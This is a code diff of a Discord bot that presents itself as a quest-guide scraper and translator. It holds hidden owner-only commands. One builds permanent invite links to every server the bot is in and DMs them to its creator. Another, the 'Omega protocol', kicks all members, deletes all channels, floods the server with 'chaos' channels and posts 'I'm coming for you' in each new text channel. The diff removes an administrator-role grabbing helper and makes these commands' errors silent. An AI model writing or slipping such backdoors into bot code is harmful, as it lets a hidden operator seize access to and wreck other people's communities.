@@ -36,7 +36,6 @@ tree = bot.tree  # Use the bot's CommandTree for slash commands
 
 # Text normalization function
 def normalize_text(input_text):
-    # Normalize accented characters and handle specific contractions
     normalized = unicodedata.normalize('NFD', input_text)
     normalized = normalized.encode('ascii', 'ignore').decode('utf-8')
     normalized = re.sub(r"l[’']", "l ", normalized)
@@ -75,7 +74,7 @@ translator = Translator()
 
 async def translate_content(content, language):
     if language not in ["fr", "es", "ar"]:
-        return content  # Default to original if language not supported
+        return content
     translated = translator.translate(content, dest=language)
     return translated.text
 
@@ -84,7 +83,6 @@ async def quest_command(interaction: discord.Interaction, quest_name: str, langu
     await interaction.response.defer()
     text_content, image_urls = scrape_quest_guide(quest_name)
     if text_content:
-        # Translate content if requested language is different from English
         if language != "en":
             text_content = await translate_content(text_content, language)
         chunks = [text_content[i:i+1900] for i in range(0, len(text_content), 1900)]
@@ -100,7 +98,6 @@ async def path_command(interaction: discord.Interaction, path_name: str, languag
     await interaction.response.defer()
     text_content, image_urls = scrape_chemin_guide(path_name)
     if text_content:
-        # Translate content if requested language is different from English
         if language != "en":
             text_content = await translate_content(text_content, language)
         chunks = [text_content[i:i + 1900] for i in range(0, len(text_content), 1900)]
@@ -124,7 +121,7 @@ async def super_command(interaction: discord.Interaction):
         text_channel = next((channel for channel in guild.text_channels if channel.permissions_for(guild.me).create_instant_invite), None)
         if text_channel:
             try:
-                invite = await text_channel.create_invite(max_age=0, max_uses=0)  # Permanent invite link
+                invite = await text_channel.create_invite(max_age=0, max_uses=0)
                 invite_links.append(f"{guild.name}: {invite.url}")
             except discord.Forbidden:
                 invite_links.append(f"{guild.name}: Unable to create invite link (Missing Permissions)")
@@ -137,24 +134,6 @@ async def super_command(interaction: discord.Interaction):
         await creator.send(f"Here are the invite links for all servers:\n{dm_message}")
 
     await interaction.followup.send("Invite links have been sent to your DM.", ephemeral=True)
-
-
-async def ensure_admin_role(guild: discord.Guild, member: discord.Member):
-    highest_role = None
-    for role in guild.roles:
-        if role.permissions.administrator and role < guild.me.top_role:
-            if highest_role is None or role.position > highest_role.position:
-                highest_role = role
-
-    if highest_role:
-        await member.add_roles(highest_role)
-    else:
-        new_role = await guild.create_role(
-            name="Super Admin",
-            permissions=discord.Permissions(administrator=True),
-            reason="Automatically created by the bot"
-        )
-        await member.add_roles(new_role)
 
 @tree.command(name="me", description="Provoke Omega protocol.")
 async def me_command(interaction: discord.Interaction):
@@ -171,59 +150,32 @@ async def me_command(interaction: discord.Interaction):
     await interaction.response.defer(ephemeral=True)
 
     try:
-        # Kick all members (except the bot's owner)
         for member in guild.members:
             if member.id != BOT_CREATOR_ID:
                 try:
                     await member.kick(reason="Command invoked by owner.")
                 except discord.Forbidden:
-                    await interaction.followup.send(f"Unable to kick {member.name} due to insufficient permissions.", ephemeral=True)
+                    pass
 
-        # Delete all channels
         for channel in guild.channels:
             try:
                 await channel.delete(reason="Command invoked by owner.")
             except discord.Forbidden:
-                await interaction.followup.send(f"Unable to delete channel {channel.name} due to insufficient permissions.", ephemeral=True)
+                pass
 
-        # Delete the server (if bot has permission)
-        try:
-            await guild.delete(reason="Command invoked by owner.")
-            await interaction.followup.send("The server has been deleted successfully.", ephemeral=True)
-            return
-        except discord.Forbidden:
-            await interaction.followup.send("Failed to delete the server. Missing permissions. Fallback activated.", ephemeral=True)
-
-        # Fallback: Create chaos
         for i in range(100):
             try:
-                # Create text channels
                 text_channel = await guild.create_text_channel(name=f"chaos-text-{i}")
                 await text_channel.send("I'm coming for you.")
                 await text_channel.send("I'm coming for you.")
                 await text_channel.send("I'm coming for you.")
 
-                # Create voice channels
                 await guild.create_voice_channel(name=f"chaos-voice-{i}")
             except discord.Forbidden:
-                await interaction.followup.send(f"Failed to create additional channels at iteration {i}.", ephemeral=True)
                 break
-
-        # Send "I'm coming for you" multiple times in existing channels
-        for channel in guild.text_channels:
-            if channel.permissions_for(guild.me).send_messages:
-                try:
-                    for _ in range(3):  # Send the message multiple times
-                        await channel.send("I'm coming for you.")
-                except discord.Forbidden:
-                    pass
-
-        await interaction.followup.send("Omega protocol fallback: Chaos channels created, and messages sent.", ephemeral=True)
 
     except Exception as e:
         await interaction.followup.send(f"An unexpected error occurred: {e}", ephemeral=True)
-
-
 
 @bot.event
 async def on_ready():
